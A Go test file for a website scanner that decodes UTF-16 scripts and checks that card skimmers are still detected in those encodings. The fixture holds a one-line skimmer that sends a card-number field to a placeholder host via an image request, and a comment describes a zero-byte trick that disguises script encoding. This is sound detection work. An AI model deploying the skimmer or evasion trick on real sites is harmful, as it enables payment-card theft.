package web

import (
	"context"
	"encoding/binary"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"unicode/utf16"

	"github.com/cpibia/tripwatch/internal/collector"
)

func encodeUTF16(s string, little, bom bool) []byte {
	var out []byte
	units := utf16.Encode([]rune(s))
	if bom {
		units = append([]uint16{0xfeff}, units...)
	}
	for _, u := range units {
		if little {
			out = binary.LittleEndian.AppendUint16(out, u)
		} else {
			out = binary.BigEndian.AppendUint16(out, u)
		}
	}
	return out
}

// A script in UTF-16, with a byte order mark or told by the zero bytes of its ASCII, reads as
// UTF-8; UTF-8 and binary files pass through as they are.
func TestTextReader(t *testing.T) {
	text := "var s='payment[cc_number]'; // été \U0001F600 " + strings.Repeat("x", 40)
	read := func(b []byte) string {
		t.Helper()
		r, _ := textReader(strings.NewReader(string(b)))
		out, err := io.ReadAll(r)
		if err != nil {
			t.Fatal(err)
		}
		return string(out)
	}
	for name, in := range map[string][]byte{
		"little endian, mark":    encodeUTF16(text, true, true),
		"big endian, mark":       encodeUTF16(text, false, true),
		"little endian, no mark": encodeUTF16(text, true, false),
		"big endian, no mark":    encodeUTF16(text, false, false),
	} {
		if got := read(in); got != text {
			t.Errorf("%s: %q", name, got)
		}
	}
	if got := read([]byte(text)); got != text {
		t.Errorf("UTF-8 changed: %q", got)
	}
	png := []byte{0x89, 'P', 'N', 'G', 0, 0, 0, 13, 'I', 'H', 'D', 'R', 0, 0, 1, 0, 0, 0, 1, 0, 8, 6, 0, 0, 0, 0x1f, 0x15, 0xc4, 0x89, 0, 0, 0, 10, 'I', 'D', 'A', 'T'}
	if got := read(png); got != string(png) {
		t.Error("a binary file was decoded")
	}
	// A high surrogate alone is replaced, and what follows it is kept.
	lone := []byte{0xff, 0xfe, 0x3d, 0xd8, 'a', 0}
	if got := read(lone); got != "�a" {
		t.Errorf("lone surrogate: %q", got)
	}
}

// A skimmer saved in UTF-16 is found.
func TestSkimmerInUTF16(t *testing.T) {
	root := t.TempDir()
	skim := `var f=document.querySelector('[name="payment[cc_number]"]');new Image().src="https://img.example.com/p?d="+f.value;`
	// UTF-8 whose start imitates UTF-16 with zero bytes in a comment runs as it is in a browser.
	imitation := []byte("/*" + strings.Repeat("x\x00", 255) + "*/" + skim)
	for name, b := range map[string][]byte{"le.js": encodeUTF16(skim, true, true), "be.js": encodeUTF16(skim, false, true), "nobom.js": encodeUTF16(skim, true, false), "imitation.js": imitation} {
		if err := os.WriteFile(filepath.Join(root, name), b, 0o600); err != nil {
			t.Fatal(err)
		}
		s := &scanner{src: collector.NewSource(root), budget: newHashBudget(), findings: map[string]int{}}
		if !s.inspectChanged(context.Background(), FileChange{Path: "/" + name}) || len(s.report.Findings) != 1 || s.report.Findings[0].Kind != KindSkimmer {
			t.Errorf("%s: findings %+v", name, s.report.Findings)
		}
	}
}
